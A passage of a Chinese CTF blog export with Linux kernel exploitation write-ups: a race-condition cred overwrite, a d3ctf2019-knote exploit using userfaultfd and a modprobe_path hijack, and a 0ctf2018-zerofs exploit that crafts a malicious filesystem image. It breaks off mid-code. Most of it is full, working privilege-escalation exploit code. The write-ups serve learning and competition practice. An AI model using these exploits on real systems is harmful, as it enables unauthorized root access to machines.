ioctl(fd,0x133A,buf);  &#125;    void listRead(void *buf,size_t size) &#123;     read(fd,buf,size);  &#125;    void listWrite(void *buf,size_t size) &#123;     write(fd,buf,size);  &#125;  //检查是否root成功  void checkWin(int i) &#123;     while (1) &#123;        sleep(1);        if (getuid() == 0) &#123;           printf(&quot;Rooted in subprocess [%d]\\n&quot;,i);           system(&quot;cat flag&quot;); //我们很难getshell           exit(0);        &#125;     &#125;  &#125;  #define BUF_SIZE PIPE_BUFFER_SIZE  #define UID 1000  char buf[BUF_SIZE];  char buf2[BUF_SIZE];  char bufA[BUF_SIZE];  char bufB[BUF_SIZE];    void fillBuf() &#123;     memset(bufA,&#x27;a&#x27;,BUF_SIZE);     memset(bufB,&#x27;b&#x27;,BUF_SIZE);  &#125;  int main() &#123;     initFD();     fillBuf();     addItem(bufA,BUF_SIZE-24);     selectItem(0);     int pid = fork();     if (pid &lt; 0) &#123;        printf(&quot;[-]fork error!!\\n&quot;);        exit(-1);     &#125; else if (pid == 0) &#123;        //开这么多子进程程，是为了增加cred结构被分配到堆下方内存的成功率        for (int i=0;i&lt;200;i++) &#123;           if (fork() == 0) &#123;              checkWin(i+1);           &#125;        &#125;        while (1) &#123;           //与主线程的listHead竞争           addItem(bufA,BUF_SIZE-24);           selectItem(0);           removeItem(0);           addItem(bufB,BUF_SIZE-24);           listRead(buf2,BUF_SIZE-24);           if (buf2[0] != &#x27;a&#x27;) &#123;              printf(&quot;race compete in child process!!\\n&quot;);              break;           &#125;           removeItem(0);        &#125;        sleep(1);        //到这里，条件竞争成功        removeItem(0); //把空间腾出来        int pfd[2];        pipe(pfd); //管道的pipe_buffer将会申请到我们能够UAF控制的空间里        write(pfd[1],bufB,BUF_SIZE);        size_t memLen = 0x1000000;        uint32_t *data = (uint32_t *)calloc(1,memLen);        listRead(data,memLen);        int count = 0;        size_t maxLen = 0;        for (int i=0;i&lt;memLen/4;i++) &#123;           if (data[i] == UID &amp;&amp; data[i+1] == UID &amp;&amp; data[i+7] == UID) &#123;              memset(data+i,0,28);              maxLen = i;              printf(&quot;[+]found cred!!\\n&quot;);              if (count ++ &gt; 2) &#123;                 break;              &#125;           &#125;        &#125;        listWrite(data,maxLen * 4);        checkWin(0);        /*size_t *d = (size_t *)data;       for (int i=0;i&lt;0x100000 / 8;i++) &#123;          printf(&quot;0x%lx &quot;,d[i]);       &#125;*/       &#125; else &#123; //主线程        while (1) &#123;           listHead(buf);           listRead(buf,BUF_SIZE-24);           if(buf[0] != &#x27;a&#x27;)              break;        &#125;     &#125;     return 0;  &#125; ","categories":["CTF"],"tags":["UAF","Linux Kernel","Linux内核堆","smap/smep","条件竞争","pipe_buffer"]},{"title":"linux kernel pwn学习之条件竞争(二)userfaultfd","url":"/2020/03/04/linux_kernel_pwn_%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%BA%8C/","content":"userfaultfd是linux下的一直缺页处理机制，用户可以自定义函数来处理这种事件。所谓的缺页，就是所访问的页面还没有装入RAM中。比如mmap创建的堆，它实际上还没有装载到内存中，系统有自己默认的机制来处理，用户也可以自定义处理函数，在处理函数没有结束之前，缺页发生的位置将处于暂停状态。这将非常有助于条件竞争的利用\n举个栗子假如在内核里有这样一段代码\nif (ptr) &#123;     ...     copy_from_user(ptr,user_buf,len);     ...  &#125;  \n\n如果，我们的user_buf是一块mmap映射的，并且未初始化的区域，此时就会触发缺页错误，copy_from_user将暂停执行，在暂停的这段时间内，我们开另一个线程，将ptr释放掉，再把其他结构申请到这里（比如tty_struct），然后当缺页处理结束后，copy_from_user恢复执行，然而ptr此时指向的是tty_struct结构，那么就能对tty_struct结构进行修改了。虽然说，不用缺页处理，也能造成条件竞争，但是几率比较小。而利用了缺页处理，几率将增加很大很大。\n大概就是这个道理，我们来看看，如何注册userfaultfd吧，话不多说，这是模板，更详细的可以自行去看看文档。\n//注册一个userfaultfd来处理缺页错误  void registerUserfault(void *fault_page,void *handler)  &#123;     pthread_t thr;     struct uffdio_api ua;     struct uffdio_register ur;     uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);     ua.api = UFFD_API;     ua.features    = 0;     if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        errExit(&quot;[-] ioctl-UFFDIO_API&quot;);       ur.range.start = (unsigned long)fault_page; //我们要监视的区域     ur.range.len   = PAGE_SIZE;     ur.mode        = UFFDIO_REGISTER_MODE_MISSING;     if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作        errExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);     //开一个线程，接收错误的信号，然后处理     int s = pthread_create(&amp;thr, NULL,handler, (void*)uffd);     if (s!=0)        errExit(&quot;[-] pthread_create&quot;);  &#125;  \n\n为了更好的理解，我们以d3ctf2019-knote为例\nd3ctf2019-knote首先，查看一下启动脚本\n#!/bin/sh  qemu-system-x86_64 \\  -m 128M \\  -kernel ./bzImage \\  -initrd  ./rootfs.img \\  -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \\  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\  -nographic \\  -monitor /dev/null \\  -smp cores=2,threads=1 \\  -cpu qemu64,+smep,+smap \\  \n\n发现开启了smep、smap机制，接下来，我们启动系统，查看一下内核版本\n\n\n在linux 5以上，似乎很难ret2usr，貌似多了其他的机制，使得单纯修改cr4不起作用，以后慢慢研究。\n然后，我们用IDA分析一下note.ko驱动文件\nIoctl定义了经典的增删改查操作\n\n\nAdd操作,有锁保护着，不担心多线程，size不能超过0xFFF\n\n\nDelete操作，也没啥好说的\n\n\nEdit操作全程没有加锁\n\n\nGet操作也是全程没有加锁\n\n\n那么思路很明显了，使用userfaultfd暂停copy_user_generic_unrolled函数，然后在另一个线程里趁机释放ptr，并把其他结构，比如tty_struct申请到这里，然后恢复copy_user_generic_unrolled的执行，从而达到对指定数据结构的读&#x2F;写，之前，我在https://blog.csdn.net/seaaseesa/article/details/104591448这篇博客了讲到了可以伪造空闲堆的next指针，实现任意地址处分配，我们就可以利用这个。在linux kernel 5以上，似乎ROP到用户的区域变得困难，那么，我们有了另一个好方法，那就是劫持modprobe_pathmodprobe_path执行了一个二进制文件，默认为&#x2F;bin&#x2F; modprobe，当系统执行一个非法二进制文件(不是elf格式，也不是文本)的时候，就会去调用modprobe_path指向的程序。\nint __request_module(bool wait, const char *fmt, ...)  &#123;      va_list args;      char module_name[MODULE_NAME_LEN];      int ret;        /*      * We don&#x27;t allow synchronous module loading from async.  Module      * init may invoke async_synchronize_full() which will end up      * waiting for this task which already is waiting for the module      * loading to complete, leading to a deadlock.      */      WARN_ON_ONCE(wait &amp;&amp; current_is_async());        if (!modprobe_path[0])          return 0;        va_start(args, fmt);      ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);      va_end(args);      if (ret &gt;= MODULE_NAME_LEN)          return -ENAMETOOLONG;        ret = security_kernel_module_request(module_name);      if (ret)          return ret;        if (atomic_dec_if_positive(&amp;kmod_concurrent_max) &lt; 0) &#123;          pr_warn_ratelimited(&quot;request_module: kmod_concurrent_max (%u) close to 0 (max_modprobes: %u), for module %s, throttling...&quot;,                      atomic_read(&amp;kmod_concurrent_max),                      MAX_KMOD_CONCURRENT, module_name);          ret = wait_event_killable_timeout(kmod_wq,                            atomic_dec_if_positive(&amp;kmod_concurrent_max) &gt;= 0,                            MAX_KMOD_ALL_BUSY_TIMEOUT * HZ);          if (!ret) &#123;              pr_warn_ratelimited(&quot;request_module: modprobe %s cannot be processed, kmod busy with %d threads for more than %d seconds now&quot;,                          module_name, MAX_KMOD_CONCURRENT, MAX_KMOD_ALL_BUSY_TIMEOUT);              return -ETIME;          &#125; else if (ret == -ERESTARTSYS) &#123;              pr_warn_ratelimited(&quot;request_module: sigkill sent for modprobe %s, giving up&quot;, module_name);              return ret;          &#125;      &#125;        trace_module_request(module_name, wait, _RET_IP_);        ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);        atomic_inc(&amp;kmod_concurrent_max);      wake_up(&amp;kmod_wq);        return ret;  &#125;  \n\n内核调用call_modprobe函数执行mobprobe_path指向的文件，并且call_modprobe函数拥有root权限，我们只需要劫持mobprobe_path，指向我们提权的脚本，然后指向一个非法二进制，就能触发提权脚本的执行\n与mobprobe_path配套的还有mod_tree，这里记录着ko模块的加载地址，因此可以用来泄露模块地址。这两个变量的地址都能在&#x2F;proc&#x2F;kallsyms里找到，因此，我们可以得到它们的静态地址。\n大概就是这样，直接上exploit.c\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;stdint.h&gt;  #include &lt;string.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;  #include &lt;linux/userfaultfd.h&gt;  #include &lt;pthread.h&gt;  #include &lt;poll.h&gt;  #include &lt;sys/syscall.h&gt;  #include &lt;sys/mman.h&gt;  //页大小  #define PAGE_SIZE 0x1000  //tty_struct的大小  #define TTY_STRUCT_SIZE 0X2E0  //cat /proc/kallsyms | grep modprobe_path  #define MOD_PROBE 0x145c5c0  //第二次利用时，堆统一的大小  //随便设置,过大过小都不好  #define CHUNK_SIZE 0x100  //modprobe_path的地址  size_t modprobe_path;    //驱动的文件描述符  int fd;  //ptmx的文件描述符  int tty_fd;    //传给驱动的数据结构  struct Data &#123;     union &#123;        size_t size; //大小        size_t index; //下标     &#125;;     void *buf; //数据  &#125;;  void errExit(char *msg) &#123;     puts(msg);     exit(-1);  &#125;    void initFD() &#123;     fd = open(&quot;/dev/knote&quot;,O_RDWR);     if (fd &lt; 0) &#123;        errExit(&quot;device open error!!&quot;);     &#125;  &#125;  //创建一个节点  void kcreate(size_t size) &#123;     struct Data data;     data.size = size;     data.buf = NULL;     ioctl(fd,0x1337,&amp;data);  &#125;  //删除一个节点  void kdelete(size_t index) &#123;     struct Data data;     data.index = index;     ioctl(fd,0x6666,&amp;data);  &#125;  //编辑一个节点  void kedit(size_t index,void *buf) &#123;     struct Data data;     data.index = index;     data.buf = buf;     ioctl(fd,0x8888,&amp;data);  &#125;  //显示节点的内容  void kshow(size_t index,void *buf) &#123;     struct Data data;     data.index = index;     data.buf = buf;     ioctl(fd,0x2333,&amp;data);  &#125;      //注册一个userfaultfd来处理缺页错误  void registerUserfault(void *fault_page,void *handler)  &#123;     pthread_t thr;     struct uffdio_api ua;     struct uffdio_register ur;     uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);     ua.api = UFFD_API;     ua.features    = 0;     if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        errExit(&quot;[-] ioctl-UFFDIO_API&quot;);       ur.range.start = (unsigned long)fault_page; //我们要监视的区域     ur.range.len   = PAGE_SIZE;     ur.mode        = UFFDIO_REGISTER_MODE_MISSING;     if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作        errExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);     //开一个线程，接收错误的信号，然后处理     int s = pthread_create(&amp;thr, NULL,handler, (void*)uffd);     if (s!=0)        errExit(&quot;[-] pthread_create&quot;);  &#125;    //针对laekKernelBase时的缺页处理线程  //这个线程里，我们不需要做什么，仅仅是  //为了拖延阻塞时间，给子进程足够的时间  //来形成一个UAF  void* leak_handler(void *arg)  &#123;     struct uffd_msg msg;     unsigned long uffd = (unsigned long)arg;     puts(&quot;[+] leak_handler created&quot;);     sleep(3); //休眠一下，留给子进程足够时间操作     struct pollfd pollfd;     int nready;     pollfd.fd     = uffd;     pollfd.events = POLLIN;     //poll会阻塞，直到收到缺页错误的消息     nready = poll(&amp;pollfd, 1, -1);     if (nready != 1)        errExit(&quot;[-] Wrong pool return value&quot;);     nready = read(uffd, &amp;msg, sizeof(msg));     if (nready &lt;= 0) &#123;        errExit(&quot;[-]msg error!!&quot;);     &#125;       char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);     if (page == MAP_FAILED)        errExit(&quot;[-]mmap page error!!&quot;);     struct uffdio_copy uc;     //初始化page页     memset(page, 0, sizeof(page));     uc.src = (unsigned long)page;     //出现缺页的位置     uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);;     uc.len = PAGE_SIZE;     uc.mode = 0;     uc.copy = 0;     //复制数据到缺页处，并恢复copy_user_generic_unrolled的执行     //然而，我们在阻塞的这段时间，堆0的内容已经是tty_struct结构     //因此，copy_user_generic_unrolled将会把tty_struct的结构复制给我们用户态     ioctl(uffd, UFFDIO_COPY, &amp;uc);       puts(&quot;[+] leak_handler done!!&quot;);     return NULL;  &#125;    //泄露内核地址  void leakKernelBase() &#123;     //创建一个与tty_struct结构大小相同的堆     kcreate(TTY_STRUCT_SIZE);     //用于接收kshow的内容，由于我们是用mmap映射的一块区域，传入kshow时，导致缺页错误，从而可以进入我们自定义的     //处理函数里阻塞     char *user_buf = (char*)mmap(NULL,PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);     if (user_buf == MAP_FAILED)        errExit(&quot;[-] mmap user_buf error!!&quot;);     //注册一个userfaultfd，监视user_buf处的缺页     registerUserfault(user_buf,leak_handler);       int pid = fork();     if (pid &lt; 0) &#123;        errExit(&quot;[-]fork error!!&quot;);     &#125; else if (pid == 0) &#123; //子进程        sleep(1); //让父进程先执行，进入userfaultfd阻塞，这样子线程可以为所欲为的操作        kdelete(0); //删除我们创建的那个堆        tty_fd = open(&quot;/dev/ptmx&quot;,O_RDWR); //这一步的作用是让tty_struct的结构申请到我们释放后的堆里，再用UAF就能泄露信息        exit(0); //退出子进程     &#125; else &#123;        //父进程触发缺页错误，从而进入handle函数，阻塞，给子进程足够的操作时间        kshow(0,user_buf);        //现在，user_buf里存储着tty_struct结构，我们读出来，可以得到很多数据        size_t *data = (size_t *)user_buf;        if (data[7] == 0) &#123; //没有数据，说明失败了           munmap(user_buf, PAGE_SIZE);           close(tty_fd);           errExit(&quot;[-]leak data error!!&quot;);        &#125;        close(tty_fd); //关闭ptmx设备,释放占用的空间        //得到某函数的地址        size_t x_fun_addr = data[0x56];        //计算出内核基址        size_t kernel_base = x_fun_addr - 0x5d4ef0;        //当内核运行未知的二进制文件时，会调用modprobe_path指向的可执行文件        //因此，我们的目的是劫持modprobe_path，指向一个shell文件即可        modprobe_path = kernel_base + MOD_PROBE;        printf(&quot;kernel_base=0x%lx\\n&quot;,kernel_base);        printf(&quot;modprobe_path=0x%lx\\n&quot;,modprobe_path);     &#125;  &#125;    //针对writeHeapFD时的缺页处理线程  //这个线程里，我们要把modprobe_path的地址  //写进去  void* write_handler(void *arg)  &#123;     struct uffd_msg msg;     unsigned long uffd = (unsigned long)arg;     puts(&quot;[+] write_handler created&quot;);     sleep(3); //休眠一下，留给子进程足够时间操作，形成UAF     struct pollfd pollfd;     int nready;     pollfd.fd     = uffd;     pollfd.events = POLLIN;     //poll会阻塞，直到收到缺页错误的消息     nready = poll(&amp;pollfd, 1, -1);     if (nready != 1)        errExit(&quot;[-] Wrong pool return value&quot;);     nready = read(uffd, &amp;msg, sizeof(msg));     if (nready &lt;= 0) &#123;        errExit(&quot;[-]msg error!!&quot;);     &#125;     //断言是否是缺页的错误     //assert(msg.event == UFFD_EVENT_PAGEFAULT);     char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);     if (page == MAP_FAILED)        errExit(&quot;[-]mmap page error!!&quot;);     struct uffdio_copy uc;     //初始化page页     memset(page, 0, sizeof(page));     //写入modprobe_path     memcpy(page,&amp;modprobe_path,8);     uc.src = (unsigned long)page;     //出现缺页的位置     uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);;     uc.len = PAGE_SIZE;     uc.mode = 0;     uc.copy = 0;     //复制数据到缺页处，并恢复copy_user_generic_unrolled的执行     //然而，我们在阻塞的这段时间，堆0被释放掉了，当恢复的时候     //是向一个已经释放的堆写数据     ioctl(uffd, UFFDIO_COPY, &amp;uc);     puts(&quot;[+] writek_handler done!!&quot;);     return NULL;  &#125;      //条件竞争改写空闲堆块的next指针,使用与leakKernelBase同样的方法  void writeHeapFD() &#123;     kcreate(CHUNK_SIZE); //0     //用于接收kedit的内容，由于我们是用mmap映射的一块区域，传入kedit时，导致缺页错误，从而可以进入我们自定义的     //处理函数里阻塞     char *user_buf = (char*)mmap(NULL,PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);     if (user_buf == MAP_FAILED)        errExit(&quot;[-] mmap user_buf error!!&quot;);     //注册一个userfaultfd，监视user_buf处的缺页     registerUserfault(user_buf,write_handler);     int pid = fork();     if (pid &lt; 0) &#123;        errExit(&quot;[-]fork error!!&quot;);     &#125; else if (pid == 0) &#123; //子进程        sleep(1); //让父进程先执行，进入userfaultfd阻塞        kdelete(0); //删除堆，形成UAF        exit(0);     &#125; else &#123;        kedit(0,user_buf); //触发缺页错误阻塞        //kedit结束后，空闲块的next域已经写上了攻击目标的地址     &#125;    &#125;    char tmp[0x100] = &#123;0&#125;;  int main() &#123;     //初始化驱动     initFD();     //条件竞争泄露内核基址     leakKernelBase();     sleep(2);     //将modprobe_path地址写到空闲堆的next指针处     writeHeapFD();     sleep(2);     kcreate(CHUNK_SIZE); //0     kcreate(CHUNK_SIZE); //1，分配到目标处     strcpy(tmp,&quot;/tmp/shell.sh&quot;);     kedit(1,tmp); //将modprobe_path指向我们的shell文件     //创建一个用于getshelll的脚本     system(&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;);     system(&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/shell.sh&quot;);     system(&quot;chmod +x /tmp/shell.sh&quot;);     //创建一个非法的二进制文件，执行，触发shell     system(&quot;echo -e &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/fake&quot;);     system(&quot;chmod +x /tmp/fake&quot;);     //触发shell执行，修改flag文件普通用户可以读写     system(&quot;/tmp/fake&quot;);     system(&quot;cat /flag&quot;);     //结束程序时，会释放堆，但是我们的modprobe_path处不是合法的堆，会释放出错，导致内核崩溃重启     sleep(3);     return 0;  &#125;\n\n失败了可以多次尝试，最后成功得到flag\n\n","categories":["CTF"],"tags":["Linux Kernel","Linux内核堆","modprobe_path","条件竞争","userfaultfd","mod_tree"]},{"title":"linux kernel 溢出之0ctf2018-zerofs","url":"/2020/02/28/linux_kernel_%E6%BA%A2%E5%87%BA_0ctf2018-zerofs/","content":"首先，我们用IDA分析一下驱动文件zerofs.ko，发现该驱动注册了一个文件系统，实现了一个自己的文件系统。\n\n\n题目改编自simplefs，https://github.com/psankar/simplefs，一个简易的文件系统，可以实现文件的存储。而本题，在上面的基础上做了精简修改。并且留有几个漏洞。一个文件系统的镜像，需要mount到目录上，才能使用。而mount是如何来识别这些文件系统的呢，这就靠驱动，register_filesystem将用户定义的文件系统注册，链接到系统维护的一个文件系统表上，mount遍历这张表，丛中取出对应的文件系统，并使用驱动里提供的一系列文件操作。\n\n\n我们看到，驱动里有一系列操作，而我们mount这种文件系统的镜像时，这里面对应的mount函数就会被调用。\n\n\n传入了zerofs_fill_super函数的地址，zerofs_fill_super函数将会被调用，我们看看zerofs_fill_super函数\n在linux下，文件系统的结构如下\n\nsuperblock：记录着文件系统的整体信息，包括inode&#x2F;block的总量、使用量、剩余量， 以及档案系统的格式与相关信息等；\n\ninode：记录档案的属性，一个档案占用一个inode，同时记录此档案的资料所在的block 号码；\n\nblock：实际记录档案的内容，若档案太大时，会占用多个block 。\n\n\n引文来自https://blog.csdn.net/Ohmyberry/article/details/80427492\n那么，这个驱动的zerofs_fill_super就是初始化superblock的操作，我们进去看看\n\n\n我们对比一下源码，就可以理解了\n/* This function, as the name implies, Makes the super_block valid and  * fills filesystem specific information in the super block */  int simplefs_fill_super(struct super_block *sb, void *data, int silent)  &#123;      struct inode *root_inode;      struct buffer_head *bh;      struct simplefs_super_block *sb_disk;      int ret = -EPERM;        bh = sb_bread(sb, SIMPLEFS_SUPERBLOCK_BLOCK_NUMBER);      BUG_ON(!bh);        sb_disk = (struct simplefs_super_block *)bh-&gt;b_data;        printk(KERN_INFO &quot;The magic number obtained in disk is: [%llu]\\n&quot;,             sb_disk-&gt;magic);        if (unlikely(sb_disk-&gt;magic != SIMPLEFS_MAGIC)) &#123;          printk(KERN_ERR                 &quot;The filesystem that you try to mount is not of type simplefs. Magicnumber mismatch.&quot;);          goto release;      &#125;        if (unlikely(sb_disk-&gt;block_size != SIMPLEFS_DEFAULT_BLOCK_SIZE)) &#123;          printk(KERN_ERR                 &quot;simplefs seem to be formatted using a non-standard block size.&quot;);          goto release;      &#125;      /** XXX: Avoid this hack, by adding one more sb wrapper, but non-disk */      sb_disk-&gt;journal = NULL;        printk(KERN_INFO             &quot;simplefs filesystem of version [%llu] formatted with a block size of [%llu] detected in the device.\\n&quot;,             sb_disk-&gt;version, sb_disk-&gt;block_size);        /* A magic number that uniquely identifies our filesystem type */      sb-&gt;s_magic = SIMPLEFS_MAGIC;        /* For all practical purposes, we will be using this s_fs_info as the super block */      sb-&gt;s_fs_info = sb_disk;        sb-&gt;s_maxbytes = SIMPLEFS_DEFAULT_BLOCK_SIZE;      sb-&gt;s_op = &amp;simplefs_sops;        root_inode = new_inode(sb);      root_inode-&gt;i_ino = SIMPLEFS_ROOTDIR_INODE_NUMBER;      inode_init_owner(root_inode, NULL, S_IFDIR);      root_inode-&gt;i_sb = sb;      root_inode-&gt;i_op = &amp;simplefs_inode_ops;      root_inode-&gt;i_fop = &amp;simplefs_dir_operations;      root_inode-&gt;i_atime = root_inode-&gt;i_mtime = root_inode-&gt;i_ctime =          current_time(root_inode);        root_inode-&gt;i_private =          simplefs_get_inode(sb, SIMPLEFS_ROOTDIR_INODE_NUMBER);        /* TODO: move such stuff into separate header. */  #if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(3, 3, 0)      sb-&gt;s_root = d_make_root(root_inode);  #else      sb-&gt;s_root = d_alloc_root(root_inode);      if (!sb-&gt;s_root)          iput(root_inode);  #endif        if (!sb-&gt;s_root) &#123;          ret = -ENOMEM;          goto release;      &#125;        if ((ret = simplefs_parse_options(sb, data)))          goto release;        if (!sb_disk-&gt;journal) &#123;          struct inode *journal_inode;          journal_inode = simplefs_iget(sb, SIMPLEFS_JOURNAL_INODE_NUMBER);            ret = simplefs_sb_load_journal(sb, journal_inode);          goto release;      &#125;      ret = jbd2_journal_load(sb_disk-&gt;journal);    release:      brelse(bh);        return ret;  &#125;  \n\n基本上是差不多的。\n\n\n我们能推出,zerofs的super_block的结构如下\n/*super_block，大小0x1000*/  struct zerofs_super_block &#123;     uint64_t magic;     uint64_t block_size;     uint64_t inodes_count;     char padding[ZEROFS_DEFAULT_BLOCK_SIZE-8*3];  &#125;;  \n\n并且相关的数据需要满足条件，不然不能挂载成功。\n我们来看看read函数\n\n\n对比simplefs的源码，我们知道，这里做了范围的检查。然后我们来看这个参数是什么\n\n\n我们来看看simplefs的源码\nssize_t simplefs_read(struct file * filp, char __user * buf, size_t len,                loff_t * ppos)  &#123;      /* After the commit dd37978c5 in the upstream linux kernel,      * we can use just filp-&gt;f_inode instead of the      * f-&gt;f_path.dentry-&gt;d_inode redirection */      struct simplefs_inode *inode =          SIMPLEFS_INODE(filp-&gt;f_path.dentry-&gt;d_inode);      struct buffer_head *bh;        char *buffer;      int nbytes;        if (*ppos &gt;= inode-&gt;file_size) &#123;          /* Read request with offset beyond the filesize */          return 0;      &#125;        bh = sb_bread(filp-&gt;f_path.dentry-&gt;d_inode-&gt;i_sb,                          inode-&gt;data_block_number);        if (!bh) &#123;          printk(KERN_ERR &quot;Reading the block number [%llu] failed.&quot;,                 inode-&gt;data_block_number);          return 0;      &#125;        buffer = (char *)bh-&gt;b_data;      nbytes = min((size_t) inode-&gt;file_size, len);        if (copy_to_user(buf, buffer, nbytes)) &#123;          brelse(bh);          printk(KERN_ERR                 &quot;Error copying file contents to the userspace buffer\\n&quot;);          return -EFAULT;      &#125;        brelse(bh);        *ppos += nbytes;        return nbytes;  &#125;  \n\n\n\nstatic inline struct simplefs_inode *SIMPLEFS_INODE(struct inode *inode)  &#123;      return inode-&gt;i_private;  &#125;  \n\n我们发现,[inode是从get_inode函数来的]{.mark}\n\n\n然后，我们看看get_inode函数，是从文件系统镜像里读取一个文件的inode，里面记录着**[文件的大小]{.mark}**等属性\n\n\n[由于这些inode是从现有的文件系统镜像里读出来的，这意味着，我们可以伪造里面的文件的size。]{.mark}\n再回来看read函数，buffer &#x3D; bh-&gt;b_data，也就是**[bread创建的一段在内存中大小有限的缓冲区]{.mark}**，而如果文件的size我们事先伪造的很大，这意味着我们就能访问缓冲区外的数据，也就是能够溢出了。\n\n\n然后，我们再看write函数，write函数缺少对边界的检查，可以越界写。\n\n\n由此，我们只**[需要伪造一个size为无穷大的文件放到这个文件系统里]{.mark}，即可实现任意地址读写。我们[直接参考simplefs的mkfs-simplefs.c源码，来制作evil镜像即可。]{.mark}**在实现了任意地址读写，我们只需在内存中搜索进程的cred结构，并把相关的uid、gid修改为0，即可提权。\n为了增加提权的成功率，我们得让cred结构在内存中的位置处于bread缓冲区的下方，这样，我们向下任意读写的时候才能找到这个结构进而覆盖。因此，我们还fork了一个子进程，因为子进程后fork，由堆分配的规律，它的cred结构被分配到内存后面的可能性比较大。\n我们完整的exploit.c程序\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;stdint.h&gt;  #include &lt;string.h&gt;  #include &lt;sys/wait.h&gt;    /*块大小*/  #define ZEROFS_DEFAULT_BLOCK_SIZE 0x1000  /*根目录的inode号*/  #define ZEROFS_ROOTDIR_INODE_NUMBER 1  #define ZEROFS_ROOTDIR_DATABLOCK_NUMBER 2    /*漏洞利用点文件的inode号*/  #define ZEROFS_EVIL_INODE_NUMBER 2  #define ZEROFS_EVIL_DATABLOCK_NUMBER 3      /*super_block，大小0x1000*/  struct zerofs_super_block &#123;     uint64_t magic;     uint64_t block_size;     uint64_t inodes_count;     char padding[ZEROFS_DEFAULT_BLOCK_SIZE-8*3];  &#125;;  /*zerofs_inode*/  struct zerofs_inode &#123;     uint64_t inode_no;     uint64_t data_block_number;     mode_t mode;     union &#123;        uint64_t file_size;        uint64_t dir_children_count;     &#125;;  &#125;;    /*文件名和序号*/  struct zerofs_dir_record &#123;     char filename[256];     uint64_t inode_no;  &#125;;    /*写super_block*/  static int write_superblock(int fd) &#123;     struct zerofs_super_block sb = &#123;        .magic = 0x4F52455ALL,        .block_size = 0x1000,        .inodes_count = 3     &#125;;     int ret = write(fd,&amp;sb, sizeof(sb));     if (ret != ZEROFS_DEFAULT_BLOCK_SIZE) &#123;        printf(&quot;bytes written [%d] are not equal to the default block size\\n&quot;,(int)ret);        return -1;     &#125; else &#123;        printf(&quot;Super block written succesfully\\n&quot;);     &#125;     return 0;  &#125;    /*写根目录节点*/  static int write_root_inode(int fd) &#123;     struct zerofs_inode root_inode;     root_inode.inode_no = ZEROFS_ROOTDIR_INODE_NUMBER;     root_inode.data_block_number = ZEROFS_ROOTDIR_DATABLOCK_NUMBER;     root_inode.mode = S_IFDIR; //代表这是一个目录     root_inode.dir_children_count = 1; //目录下有一个文件     int ret = write(fd, &amp;root_inode, sizeof(root_inode));     if (ret != sizeof(root_inode)) &#123;        printf(&quot;The inode store was not written properly. Retry\\n&quot;);        return -1;     &#125;     printf(&quot;root directory inode written succesfully\\n&quot;);     return 0;  &#125;  /*这个文件，就是我们的漏洞利用点，我们创建一个size为-1的文件，即相当于无穷大*/  static int write_evil_inode(int fd) &#123;     struct zerofs_inode evil_inode;     evil_inode.inode_no = ZEROFS_EVIL_INODE_NUMBER;     evil_inode.data_block_number = ZEROFS_EVIL_DATABLOCK_NUMBER;     evil_inode.mode = S_IFREG; //代表一个普通文件     evil_inode.file_size = -1; //这里是重点！！     int len = sizeof(evil_inode);     int ret = write(fd,&amp;evil_inode,len);     if (ret != len) &#123;        printf(&quot;The evil inode was not written properly. Retry\\n&quot;);        return -1;     &#125;     printf(&quot;evil inode written succesfully\\n&quot;);     return 0;  &#125;    /*写文件名信息*/  int write_evil_dirent(int fd) &#123;     struct zerofs_dir_record evil_record;     strcpy(evil_record.filename,&quot;haivk&quot;); //文件名为haivk     evil_record.inode_no = ZEROFS_EVIL_INODE_NUMBER; //这个号对应我们前面的那个evil_inode的号     int len = sizeof(struct zerofs_dir_record);     int ret = write(fd,&amp;evil_record,len);     if (ret != len) &#123;        printf(&quot;The evil inode\\&#x27;s dirent was not written properly. Retry\\n&quot;);        return -1;     &#125;     printf(&quot;evil inode\\&#x27;s dirent written succesfully\\n&quot;);     return 0;  &#125;  /*写填充字节*/  int writePadding(int fd,int len) &#123;     //写填充字节     char *padding = (char *)calloc(1,len);     int ret = write(fd,padding,len);     free(padding);     if (ret != len) &#123;        printf(&quot;The padding was not written properly. Retry\\n&quot;);        return -1;     &#125;     return 0;  &#125;    int createEvilFs() &#123;     int fd = open(&quot;/tmp/zerofs.img&quot;,O_RDWR | O_CREAT);     if (write_superblock(fd)) &#123;        return -1;     &#125;     if (write_root_inode(fd)) &#123;        return -1;     &#125;     if (write_evil_inode(fd)) &#123;        return -1;     &#125;     if 